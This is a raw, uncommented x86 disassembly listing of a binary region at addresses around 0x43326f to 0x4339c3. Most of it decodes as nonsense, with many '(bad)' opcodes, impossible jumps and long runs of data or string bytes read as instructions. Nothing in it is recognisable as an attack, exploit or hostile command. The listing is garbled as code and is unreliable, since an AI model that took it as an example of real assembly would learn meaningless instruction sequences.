  43326f:	lea    eax,ds:0x4d72c4
  433275:	mov    ecx,DWORD PTR [ebp-0x4]
  433278:	xor    ecx,edi
  43327a:	bswap  ebx
  43327c:	ror    BYTE PTR [ebp-0x35],0xe9
  433280:	rol    DWORD PTR [ecx],0x84
  433283:	add    BYTE PTR [ecx],al
  433285:	xor    eax,DWORD PTR [eax]
  433287:	pushf  
  433288:	inc    ebp
  433289:	jnp    0x8a43668c
  43328f:	mov    eax,DWORD PTR ds:0xcf72e8
  433295:	lock dec ebp
  433297:	retf   
  433298:	xor    ecx,DWORD PTR [ebp+0xf]
  43329b:	mov    eax,eax
  43329d:	fmul   st,st(3)
  43329f:	test   ecx,0x19b8484
  4332a5:	xor    al,BYTE PTR [eax]
  4332a7:	mov    DWORD PTR [ebp-0x28],eax
  4332aa:	mov    eax,DWORD PTR [ebp+0x33]
  4332ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4332b3:	ret    
  4332b4:	add    al,cl
  4332b6:	dec    ebp
  4332b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4332bd:	add    ecx,DWORD PTR ds:0xc7250
  4332c3:	inc    ebp
  4332c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4332c8:	mov    edi,edi
  4332ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4332d0:	jb     0x433299
  4332d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4332d9:	mov    esi,DWORD PTR [ebx]
  4332db:	cld    
  4332dc:	mov    cl,bh
  4332de:	or     eax,0x372b6
  4332e3:	cmp    ecx,eax
  4332e5:	jne    0x433362
  4332eb:	mov    eax,DWORD PTR [ebp-0x20]
  4332ee:	mov    eax,DWORD PTR [eax]
  4332f0:	xor    eax,edi
  4332f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4332f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4332fc:	mov    ecx,edi
  4332fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433304:	jb     0x433315
  433306:	add    BYTE PTR [edi-0x3f],dl
  433309:	add    BYTE PTR [ebp-0x75],cl
  43330c:	mov    esi,eax
  43330e:	xor    eax,DWORD PTR [eax]
  433310:	mov    al,bh
  433312:	or     eax,0x4b7284
  433317:	xor    al,cl
  433319:	mov    ecx,DWORD PTR [ebp-0x4]
  43331c:	mov    ecx,edi
  43331e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433324:	jb     0x433335
  433326:	add    BYTE PTR [edi],dh
  433328:	enter  0x8500,0x8b
  43332c:	add    ah,bl
  43332e:	add    BYTE PTR [eax],al
  433330:	inc    ebp
  433331:	(bad)  
  433332:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433339:	mov    esi,DWORD PTR [edx-0x4]
  43333c:	add    bh,cl
  43333e:	dec    ebp
  43333f:	mov    dh,0x8b
  433341:	add    esi,DWORD PTR [ebx]
  433343:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433349:	add    BYTE PTR [eax],al
  43334b:	mov    eax,ecx
  43334d:	loopne 0x43339c
  43334f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433355:	dec    ebx
  433356:	or     eax,0x8b7232
  43335b:	in     al,0xc1
  43335d:	or     DWORD PTR [ebp-0x31],ecx
  433360:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433367:	xor    dh,BYTE PTR [edx-0x75]
  43336a:	add    al,dh
  43336c:	enter  0x4f09,0xcf
  433370:	inc    ebp
  433371:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433377:	or     al,BYTE PTR ds:0xe4728b
  43337d:	or     DWORD PTR [ebp-0x31],ecx
  433380:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433387:	cmp    dh,BYTE PTR [edx+0xf]
  43338a:	add    bl,dl
  43338c:	rol    DWORD PTR [eax],0x4d
  43338f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433395:	(bad)  
  433396:	or     eax,0x4b7284
  43339b:	xor    al,cl
  43339d:	mov    ecx,DWORD PTR [ebp-0x20]
  4333a0:	mov    ecx,DWORD PTR [ecx]
  4333a2:	xor    ecx,edi
  4333a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4333ab:	xor    cl,al
  4333ad:	mov    ecx,DWORD PTR [edi]
  4333af:	fadd   QWORD PTR [ebp+0x9]
  4333b2:	call   0xffd02e86
  4333b7:	dec    ebx
  4333b8:	dec    ebp
  4333b9:	xor    bh,BYTE PTR [ebx]
  4333bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4333bf:	loopne 0x4333bd
  4333c1:	or     edi,eax
  4333c3:	iret   
  4333c4:	ret    
  4333c5:	mov    WORD PTR [ebp+0x4f],es
  4333c8:	mov    esi,DWORD PTR [edx]
  4333ca:	call   0x8452fb09
  4333cf:	(bad)  
  4333d0:	fwait
  4333d1:	add    BYTE PTR [edx],dh
  4333d3:	mov    esi,DWORD PTR [ebx]
  4333d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4333db:	test   BYTE PTR [ebx],dh
  4333dd:	dec    ebx
  4333de:	add    esi,DWORD PTR [edx]
  4333e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333e6:	dec    edi
  4333e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4333ef:	xor    al,BYTE PTR [ebx]
  4333f1:	mov    edi,DWORD PTR [ebx]
  4333f3:	in     al,0x75
  4333f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333fb:	dec    ebx
  4333fc:	xor    esi,DWORD PTR [edx]
  4333fe:	lea    ecx,[edx]
  433400:	or     BYTE PTR [ebx+0x900f072],cl
  433406:	ja     0x4333d7
  433408:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43340f:	cmp    ch,al
  433411:	jne    0x433406
  433413:	mov    edi,edi
  433415:	fadd   QWORD PTR [ebp+0x0]
  433418:	mov    eax,edi
  43341a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433421:	mov    edx,DWORD PTR [ebx]
  433423:	in     al,0x45
  433425:	or     DWORD PTR [ebx],esi
  433427:	iret   
  433428:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43342f:	xor    dl,BYTE PTR [eax-0x75]
  433432:	sbb    al,0xe0
  433434:	dec    DWORD PTR [ecx]
  433436:	mov    ecx,edi
  433438:	in     al,dx
  433439:	mov    eax,es
  43343b:	dec    ebx
  43343c:	mov    DWORD PTR [edx],esi
  43343e:	fmul   QWORD PTR [edx]
  433440:	jne    0x4333cd
  433442:	(bad)  
  433443:	(bad)  
  433445:	or     DWORD PTR [ebp-0x31],eax
  433448:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43344f:	cmp    bh,bh
  433451:	jne    0x433498
  433453:	lea    ecx,[ebx-0x38372750]
  433459:	inc    ebx
  43345b:	mov    eax,ecx
  43345d:	mov    eax,0xa00c111
  433462:	jne    0x4334a9
  433464:	mov    esi,DWORD PTR [ebx]
  433466:	test   al,0x3
  433468:	inc    ebp
  433469:	mov    DWORD PTR [eax-0xc],edx
  43346c:	loop   0x4334b3
  43346e:	push   DWORD PTR [ebx]
  433470:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433476:	add    DWORD PTR [eax],eax
  433478:	mov    eax,edi
  43347a:	lods   al,BYTE PTR ds:[esi]
  43347b:	dec    ebp
  43347c:	inc    ebp
  43347d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433483:	retf   
  433484:	mov    edx,ecx
  433486:	adc    al,0x84
  433488:	(bad)  
  433489:	std    
  43348a:	ret    
  43348b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433491:	hlt    
  433492:	rol    edi,0x82
  433495:	ret    
  433496:	cld    
  433497:	enter  0x11ff,0x45
  43349b:	inc    ebp
  43349c:	pop    edi
  43349d:	mov    ebx,DWORD PTR [ebx+0x14]
  4334a0:	ret    0xc7
  4334a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4334a9:	jmp    0x433436
  4334ab:	push   0x8
  4334ad:	call   DWORD PTR [esi]
  4334af:	in     al,dx
  4334b0:	add    BYTE PTR [ebp+0x1],0x50
  4334b4:	add    bh,ah
  4334b6:	add    bh,bh
  4334b8:	icebp  
  4334b9:	mov    ecx,DWORD PTR [eax]
  4334bb:	cld    
  4334bc:	pop    es
  4334bd:	dec    ebp
  4334be:	shl    DWORD PTR [ebx],0x72
  4334c1:	add    eax,DWORD PTR [eax]
  4334c3:	cmp    edx,ecx
  4334c5:	je     0x4334d7
  4334c7:	mov    esi,DWORD PTR [ebp-0x4]
  4334ca:	inc    edi
  4334cc:	or     al,0xc3
  4334ce:	jmp    FWORD PTR [edx-0x18]
  4334d1:	(bad)  
  4334d2:	sti    
  4334d3:	cwde   
  4334d4:	(bad)  
  4334d5:	call   0xffa12de0
  4334da:	or     al,0x45
  4334dc:	push   ebp
  4334dd:	sub    esp,0x18
  4334e0:	push   ebx
  4334e1:	inc    ebp
  4334e2:	mov    edi,edi
  4334e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334eb:	test   al,0x54
  4334ed:	inc    ebp
  4334ee:	push   ecx
  4334ef:	push   eax
  4334f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334f6:	add    ah,bh
  4334f8:	(bad)  
  4334f9:	dec    ebp
  4334fa:	add    DWORD PTR [ebx],esi
  4334fc:	inc    ebp
  4334fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433503:	push   0xffffff8b
  433505:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43350b:	add    eax,DWORD PTR [ecx]
  43350d:	or     BYTE PTR [eax],al
  43350f:	call   0xff852d14
  433514:	mov    eax,DWORD PTR [ebp+0x14]
  433517:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43351d:	inc    ebp
  43351e:	dec    ecx
  43351f:	add    ebp,DWORD PTR [edx+0x14]
  433522:	push   0x8b3045
  433527:	call   0x33ad829c
  43352c:	inc    DWORD PTR [ebx]
  43352e:	mov    DWORD PTR [edi],ecx
  433530:	mov    eax,ecx
  433532:	or     BYTE PTR [ebp-0x3d],cl
  433535:	cmp    eax,edi
  433537:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43353c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433542:	adc    al,0xc9
  433544:	inc    ebp
  433545:	adc    BYTE PTR [eax+0x55],dl
  433548:	jne    0x433536
  43354a:	call   0xff5434da
  43354f:	dec    ebp
  433550:	inc    ebp
  433551:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433557:	add    BYTE PTR [ebx],bh
  433559:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43355d:	push   esp
  43355e:	or     al,0x51
  433560:	dec    ebp
  433561:	xor    DWORD PTR [ebx],0xf32039b
  433567:	cmp    eax,DWORD PTR [ebp+0x74]
  43356a:	mov    edi,edi
  43356c:	pop    edi
  43356d:	adc    BYTE PTR [ebx+0x75],bl
  433570:	ret    0x50
  433573:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433577:	(bad)  
  433578:	clc    
  433579:	mov    esp,ebp
  43357b:	pop    ecx
  43357c:	mov    ecx,0xf80085c2
  433581:	mov    ecx,DWORD PTR [ecx+edx*2]
  433584:	push   esi
  433585:	push   esi
  433586:	(bad)  
  433587:	lock add DWORD PTR [ebp+0x44],eax
  43358b:	mov    edx,DWORD PTR [eax]
  43358d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433591:	or     BYTE PTR [edi+eax*1+0x51],dl
  433595:	ret    
  433596:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43359c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4335a2:	or     al,0x80
  4335a4:	jge    0x4335a7
  4335a6:	mov    DWORD PTR [eax],eax
  4335a8:	and    al,0x8
  4335aa:	cmp    DWORD PTR [ebp+0x10],eax
  4335ad:	mov    edx,DWORD PTR [esi]
  4335af:	xchg   esp,eax
  4335b0:	dec    esp
  4335b1:	add    BYTE PTR [eax],dl
  4335b3:	mov    ecx,edx
  4335b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4335b9:	dec    ebp
  4335ba:	into   
  4335bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4335c1:	mov    edx,DWORD PTR [eax+0x14]
  4335c4:	das    
  4335c5:	add    al,0x45
  4335c7:	add    BYTE PTR [ebp+0x0],dh
  4335ca:	mov    edi,edi
  4335cc:	and    al,0x50
  4335ce:	mov    eax,DWORD PTR [eax]
  4335d0:	and    al,0xd1
  4335d2:	xor    eax,DWORD PTR [esi]
  4335d4:	lea    eax,[ebp+0x8]
  4335d7:	xor    esi,DWORD PTR [edx+0x3]
  4335da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335f0:	cmp    al,0xff
  4335f2:	pushf  
  4335f3:	mov    edi,edi
  4335f5:	or     BYTE PTR [esi+ecx*1],cl
  4335f8:	jne    0x4335bd
  4335fa:	call   0xc35c6
  4335ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433603:	mov    ebx,DWORD PTR [eax]
  433605:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433609:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433611:	pop    esi
  433612:	and    al,0xc9
  433614:	and    al,0x10
  433616:	call   DWORD PTR [ebp-0x73]
  433619:	in     al,dx
  43361a:	jmp    esp
  43361c:	je     0x4335a1
  43361e:	call   DWORD PTR [eax]
  433620:	and    al,0x31
  433622:	call   0xffcd34c3
  433627:	and    al,0x44
  433629:	push   edi
  43362a:	or     al,0x41
  43362c:	pop    esi
  43362d:	mov    ebp,esp
  43362f:	and    al,0xc2
  433631:	mov    eax,DWORD PTR [eax]
  433633:	and    al,0x85
  433635:	mov    edx,0x733080e
  43363a:	jne    0x433636
  43363c:	test   DWORD PTR [ebx+0x3083275],ebx
  433642:	dec    DWORD PTR [ecx-0x74dbdb15]
  433648:	sbb    BYTE PTR [esp+edx*1],cl
  43364b:	jl     0x43364c
  43364d:	adc    al,0x24
  43364f:	dec    ebp
  433650:	mov    esi,DWORD PTR [ebp+0xc]
  433653:	mov    ecx,DWORD PTR [eax]
  433655:	and    al,0x39
  433657:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43365a:	or     BYTE PTR [eax+edx*1],ah
  43365d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433664:	clc    
  433665:	jmp    0x433603
  433667:	adc    al,bh
  433669:	inc    esp
  43366a:	je     0x4336b8
  43366c:	and    al,0xc2
  43366e:	je     0x43360b
  433670:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433676:	dec    DWORD PTR [ecx+0x235fbf08]
  43367c:	sbb    al,0x10
  43367e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433682:	add    BYTE PTR [ebx+0xb],dh
  433685:	adc    BYTE PTR [eax],al
  433687:	mov    WORD PTR ds:0x3d450010,?
  43368d:	adc    BYTE PTR [eax],al
  43368f:	add    DWORD PTR [eax+edx*1],esp
  433692:	add    BYTE PTR [edx+0x6],cl
  433695:	adc    BYTE PTR [eax],al
  433697:	sub    dx,WORD PTR [eax]
  43369a:	add    bh,dl
  43369c:	imul   edx,DWORD PTR [eax],0x10302300
  4336a2:	add    BYTE PTR [esi+0x7b001077],dl
  4336a8:	ss inc ebx
  4336aa:	add    BYTE PTR [edi+0x36],bh
  4336ad:	inc    ebx
  4336ae:	add    BYTE PTR [ebx-0x78ffbcca],al
  4336b4:	ss inc ebx
  4336b6:	add    BYTE PTR [ebx-0x70ffbcca],cl
  4336bc:	ss inc ebx
  4336be:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336c4:	ss inc ebx
  4336c6:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [ebx-0x5fffbcca],ah
  4336d4:	adc    DWORD PTR [eax],edx
  4336d6:	add    BYTE PTR [ecx],cl
  4336d8:	jo     0x4336ea
  4336da:	add    BYTE PTR ds:0xd7001027,ch
  4336e0:	pop    eax
  4336e1:	adc    BYTE PTR [eax],al
  4336e3:	push   es
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [esi+0x33001031],ah
  4336ec:	ins    BYTE PTR es:[edi],dx
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jb     0x433730
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	shl    DWORD PTR [esi],cl
  4336f5:	inc    ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    dh,cl
  433714:	jge    0x433726
  433716:	add    BYTE PTR [esi-0x3dffef8e],dl
  43371c:	or     dl,BYTE PTR [eax]
  43371e:	add    dh,bl
  433720:	sub    dl,BYTE PTR [eax]
  433722:	add    BYTE PTR [edx],bl
  433724:	ins    BYTE PTR es:[edi],dx
  433725:	adc    BYTE PTR [eax],al
  433727:	addr16 jno 0x43373a
  43372a:	add    BYTE PTR [ebp+0x3d],ch
  43372d:	adc    BYTE PTR [eax],al
  43372f:	lds    esp,FWORD PTR [eax+0x10]
  433732:	add    BYTE PTR [ebx],dl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+edx*1],bh
  433755:	adc    BYTE PTR [eax],al
  433757:	clc    
  433758:	cmp    dl,BYTE PTR [eax]
  43375a:	add    BYTE PTR [ecx],ah
  43375c:	pop    ds
  43375d:	adc    BYTE PTR [eax],al
  43375f:	mov    edi,0x6001073
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [ecx+0x34],bh
  433769:	adc    BYTE PTR [eax],al
  43376b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43376f:	shl    DWORD PTR [edx+0x10],1
  433772:	add    BYTE PTR [ebx+0x37],dl
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebp+0x14],al
  433795:	adc    BYTE PTR [eax],al
  433797:	fwait
  433798:	pop    ds
  433799:	adc    BYTE PTR [eax],al
  43379b:	jnp    0x4337c0
  43379d:	adc    BYTE PTR [eax],al
  43379f:	pop    esi
  4337a0:	adc    BYTE PTR cs:[eax],al
  4337a3:	popf   
  4337a4:	jno    0x4337b6
  4337a6:	add    ah,bl
  4337a8:	inc    ebp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	sbb    edx,DWORD PTR [edx+0x10]
  4337ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [edi-0x64ffbcc9],dl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [edi-0x5cffbcc9],bl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi+0x54004337],ch
  4337d4:	xor    al,0x4b
  4337d6:	aaa    
  4337d7:	pop    edi
  4337d8:	inc    edx
  4337d9:	dec    ebx
  4337da:	xor    DWORD PTR [ecx],edi
  4337dc:	push   edi
  4337dd:	add    BYTE PTR [ecx+0x39],cl
  4337e0:	xor    al,0x5f
  4337e2:	pop    ecx
  4337e3:	inc    edi
  4337e4:	push   edx
  4337e5:	pop    edi
  4337e6:	dec    edx
  4337e7:	xor    al,BYTE PTR [edx+0x30]
  4337ea:	push   ebx
  4337eb:	add    BYTE PTR [ecx+0x4a],cl
  4337ee:	cmp    BYTE PTR [edi+0x38],bl
  4337f1:	xor    al,0x43
  4337f3:	xor    bl,BYTE PTR [eax+0x36]
  4337f6:	pop    edi
  4337f7:	inc    ebx
  4337f8:	add    BYTE PTR [edx+0x33],cl
  4337fb:	dec    ebp
  4337fc:	cmp    BYTE PTR [edi+0x53],bl
  4337ff:	xor    DWORD PTR [eax],edi
  433801:	pop    edx
  433802:	pop    edi
  433803:	xor    BYTE PTR [edx+0x52],cl
  433806:	inc    ecx
  433807:	add    BYTE PTR [edx+0x42],al
  43380a:	inc    ebp
  43380b:	pop    edi
  43380c:	cmp    DWORD PTR [eax],edi
  43380e:	push   ebp
  43380f:	inc    edx
  433810:	xor    eax,0x5244505f
  433815:	xor    BYTE PTR [eax],al
  433817:	inc    edx
  433818:	inc    esp
  433819:	inc    edx
  43381a:	cmp    DWORD PTR [edi+0x52],ebx
  43381d:	dec    esp
  43381e:	inc    ebp
  43381f:	add    BYTE PTR [ebx+0x37],dl
  433822:	push   esp
  433823:	xor    BYTE PTR [edi+0x55],bl
  433826:	push   ebx
  433827:	aaa    
  433828:	dec    ebp
  433829:	pop    edi
  43382a:	xor    ecx,DWORD PTR [edx+0x4e]
  43382d:	dec    ebx
  43382e:	add    BYTE PTR [edx+0x47],cl
  433831:	inc    edi
  433832:	xor    eax,0x534e5f32
  433837:	push   esp
  433838:	pop    edi
  433839:	push   esp
  43383a:	inc    edx
  43383b:	add    BYTE PTR [ebx+0x4d],al
  43383e:	xor    BYTE PTR [edi+0x47],bl
  433841:	cmp    DWORD PTR [ecx+0x5f],ebx
  433844:	push   eax
  433845:	push   ecx
  433846:	push   ecx
  433847:	pop    edi
  433848:	inc    ebx
  433849:	push   edi
  43384a:	push   esi
  43384b:	add    BYTE PTR [ecx+0x57],cl
  43384e:	inc    ebp
  43384f:	pop    edi
  433850:	pop    ecx
  433851:	push   edx
  433852:	inc    edx
  433853:	pop    edi
  433854:	inc    edi
  433855:	add    BYTE PTR [ebx+0x51],dl
  433858:	cmp    DWORD PTR ds:0x4d305f33,esi
  43385e:	inc    edi
  43385f:	xor    edx,DWORD PTR [edx+0x34]
  433862:	pop    edi
  433863:	pop    edx
  433864:	cmp    BYTE PTR [eax],al
  433866:	inc    edi
  433867:	xor    esi,DWORD PTR ds:0x5451585f
  43386d:	dec    esp
  43386e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433872:	pop    edi
  433873:	cmp    BYTE PTR [edi+0x49],dl
  433876:	xor    eax,0x5700505f
  43387b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43387f:	dec    esi
  433880:	dec    edx
  433881:	cmp    BYTE PTR [eax],al
  433883:	pop    edx
  433884:	dec    ebx
  433885:	xor    eax,0x4f5f3131
  43388a:	xor    dh,BYTE PTR [ecx]
  43388c:	pop    edi
  43388d:	inc    ebp
  43388e:	push   esp
  43388f:	inc    esp
  433890:	inc    ebp
  433891:	add    BYTE PTR [edi+0x55],dl
  433894:	cmp    DWORD PTR [edi+0x5a],ebx
  433897:	push   edx
  433898:	inc    edi
  433899:	xor    DWORD PTR [ebp+0x0],ecx
  43389c:	pop    edx
  43389d:	dec    ecx
  43389e:	dec    ebp
  43389f:	ss pop edi
  4338a1:	pop    edx
  4338a2:	push   edx
  4338a3:	cmp    BYTE PTR [esi+0x30],dl
  4338a6:	pop    edi
  4338a7:	push   ecx
  4338a8:	dec    esi
  4338a9:	add    BYTE PTR [ebx+0x32],dl
  4338ac:	inc    ebx
  4338ad:	cmp    BYTE PTR [edi+0x52],bl
  4338b0:	dec    ecx
  4338b1:	xor    BYTE PTR [eax],al
  4338b3:	inc    edi
  4338b4:	xor    eax,0x314f5f4b
  4338b9:	xor    DWORD PTR [edi+0x38],ebx
  4338bc:	push   ebp
  4338bd:	add    BYTE PTR [edi+0x4b],al
  4338c0:	xor    bl,BYTE PTR [edi+0x43]
  4338c3:	push   ebp
  4338c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4338c7:	ss pop edi
  4338c9:	pop    edx
  4338ca:	push   edi
  4338cb:	inc    esp
  4338cc:	xor    BYTE PTR [eax],al
  4338ce:	dec    ecx
  4338cf:	inc    edi
  4338d0:	xor    eax,0x3058555f
  4338d5:	dec    ebx
  4338d6:	pop    edi
  4338d7:	push   edi
  4338d8:	add    BYTE PTR [eax+0x0],bl
  4338db:	inc    edi
  4338dc:	add    BYTE PTR [edx+0x0],al
  4338df:	pop    edi
  4338e0:	add    BYTE PTR [ebx],dh
  4338e2:	add    BYTE PTR [eax],bh
  4338e4:	add    BYTE PTR [ebx+0x0],cl
  4338e7:	xor    eax,0x33003500
  4338ec:	add    BYTE PTR [eax],dh
  4338ee:	add    BYTE PTR [edi+0x0],bl
  4338f1:	push   esp
  4338f2:	add    BYTE PTR [ebp+0x0],cl
  4338f5:	xor    BYTE PTR [eax],al
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	inc    esi
  4338fa:	add    BYTE PTR [eax+0x0],bl
  4338fd:	xor    BYTE PTR [eax],al
  4338ff:	pop    edi
  433900:	add    BYTE PTR [ecx],dh
  433902:	add    BYTE PTR [ebx+0x0],al
  433905:	xor    eax,0x5f003100
  43390a:	add    BYTE PTR [ecx+0x0],al
  43390d:	xor    eax,DWORD PTR [eax]
  43390f:	add    BYTE PTR [eax],al
  433911:	push   ebx
  433912:	add    BYTE PTR [ebx+0x0],dl
  433915:	dec    eax
  433916:	add    BYTE PTR [edi+0x0],bl
  433919:	push   esp
  43391a:	add    BYTE PTR [ebx+0x0],al
  43391d:	push   ebx
  43391e:	add    BYTE PTR [edx+0x0],dl
  433921:	pop    edi
  433922:	add    BYTE PTR [ecx+0x0],dl
  433925:	dec    edi
  433926:	add    BYTE PTR [edi+0x0],al
  433929:	push   ecx
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	pop    ecx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],cl
  433933:	dec    edi
  433934:	add    BYTE PTR [ebp+0x0],dl
  433937:	cmp    DWORD PTR [eax],eax
  433939:	pop    edi
  43393a:	add    BYTE PTR [edx],dh
  43393c:	add    BYTE PTR [eax+eax*1+0x32],al
  433940:	add    BYTE PTR ds:0x47005f00,dh
  433946:	add    BYTE PTR ds:0x48000000,dh
  43394c:	add    BYTE PTR [edx+0x0],cl
  43394f:	push   eax
  433950:	add    BYTE PTR [edi+0x0],bl
  433953:	cmp    BYTE PTR [eax],al
  433955:	add    BYTE PTR ss:0x55004100,dh
  43395c:	add    BYTE PTR [edi+0x0],bl
  43395f:	push   edx
  433960:	add    BYTE PTR [edi],dh
  433962:	add    BYTE PTR [ecx+0x0],cl
  433965:	add    BYTE PTR [eax],al
  433967:	inc    esp
  433968:	add    BYTE PTR [ecx+0x0],dl
  43396b:	inc    edx
  43396c:	add    BYTE PTR [edi+0x0],bl
  43396f:	push   ecx
  433970:	add    BYTE PTR [ecx+0x0],bl
  433973:	dec    edi
  433974:	add    BYTE PTR [eax+0x0],dl
  433977:	add    BYTE PTR [eax],al
  433979:	dec    edx
  43397a:	add    BYTE PTR [ecx+0x0],dl
  43397d:	inc    esp
  43397e:	add    BYTE PTR [edi+0x0],bl
  433981:	dec    edx
  433982:	add    BYTE PTR [eax],dh
  433984:	add    BYTE PTR [ecx],dh
  433986:	add    BYTE PTR [ebx+0x0],dl
  433989:	push   ecx
  43398a:	add    BYTE PTR [ecx],dh
  43398c:	add    BYTE PTR [edi+0x0],bl
  43398f:	push   edi
  433990:	add    BYTE PTR [eax],al
  433992:	add    BYTE PTR [ebx+0x0],cl
  433995:	pop    edx
  433996:	add    BYTE PTR [esi],dh
  433998:	add    BYTE PTR [edi+0x0],bl
  43399b:	inc    ebx
  43399c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4339a0:	add    BYTE PTR [edi+0x0],bl
  4339a3:	push   edi
  4339a4:	add    BYTE PTR [ebx],dh
  4339a6:	add    BYTE PTR [esi+0x0],cl
  4339a9:	push   ebp
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	dec    edx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],dl
  4339b3:	aaa    
  4339b4:	add    BYTE PTR [eax],bh
  4339b6:	add    BYTE PTR [edi+0x0],bl
  4339b9:	pop    eax
  4339ba:	add    BYTE PTR [edi+0x0],cl
  4339bd:	inc    edi
  4339be:	add    BYTE PTR [edi+0x0],bl
  4339c1:	xor    al,0x0
  4339c3:	push   eax
